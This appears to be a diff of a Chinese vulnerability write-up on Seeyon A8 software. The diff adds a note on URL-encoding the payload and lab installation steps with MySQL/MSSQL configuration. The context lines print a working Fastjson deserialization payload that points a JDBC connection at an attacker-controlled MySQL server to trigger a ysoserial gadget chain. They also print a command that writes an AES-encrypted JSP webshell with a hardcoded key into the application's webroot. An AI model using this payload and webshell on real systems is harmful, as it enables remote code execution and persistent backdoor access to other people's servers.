@@ -85,6 +85,10 @@ vps上执行 python server.py，yso看了下这篇文章中师傅改的https://w
 _json_params={"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"x.x.x.x","portToConnectTo":3306,"info":{"user":"yso_CommonsBeanutils1Tomcat89Echo_data","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"test","url":"jdbc:mysql://x.x.x.x:3306/test?user=yso_CommonsBeanutils1Tomcat89Echo_data&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"}
 ```
 
+payload url编码一下
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105161642.png)
+
 直接写webshell，webshell路径自行替换
 
 echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> > D:\UFSeeyon\A8\Enterprise\ApacheJetspeed\webapps\ROOT\2.jsp
@@ -114,6 +118,30 @@ usDiffInterceptor"}
 ```
 
 利用也是一样的
+
+## 0x06 安装过程
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105161408.png)
+
+mysql账号密码配置
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105161503.png)
+
+然后点start.bat启动
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105162240.png)
+
+mssql数据库的话需要选
+
+Chinese_PRC_90_CI_AI；
+
+创建数据库名，[协同数据库名] 改成seeyon，或者自定义都可
+
+ALTER DATABASE [协同数据库名] SET READ_COMMITTED_SNAPSHOT ON;
+
+select is_read_committed_snapshot_on from sys.databases where name='协同数据 库名';
+
+
 
 ## 参考资料
 
